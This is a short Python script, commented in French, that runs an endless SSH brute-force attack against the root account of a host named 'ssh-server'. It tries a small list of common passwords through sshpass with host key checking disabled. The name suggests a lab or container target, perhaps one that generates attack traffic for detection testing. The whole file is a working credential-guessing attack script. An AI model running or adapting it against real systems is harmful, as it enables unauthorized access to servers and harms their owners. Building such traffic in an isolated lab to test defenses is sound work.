#!/usr/bin/env python3
import subprocess
import time

TARGET_IP = "ssh-server"
SSH_PORT = 22
USERNAME = "root"
WORDLIST = ["toor", "123456", "admin", "password", "root123"]

print("[*] Début de l'attaque brute force sur {}:{}".format(TARGET_IP, SSH_PORT))

while True:
    for password in WORDLIST:
        try:
            subprocess.run(
                ["sshpass", "-p", password, "ssh",
                 "-o", "StrictHostKeyChecking=no",
                 "-o", "ConnectTimeout=2",
                 "-p", str(SSH_PORT),
                 f"{USERNAME}@{TARGET_IP}", "exit"],
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL
            )
        except Exception:
            pass
        time.sleep(1)

# jamais de [*] fin de l'attaque, car on boucle pour l'éternité
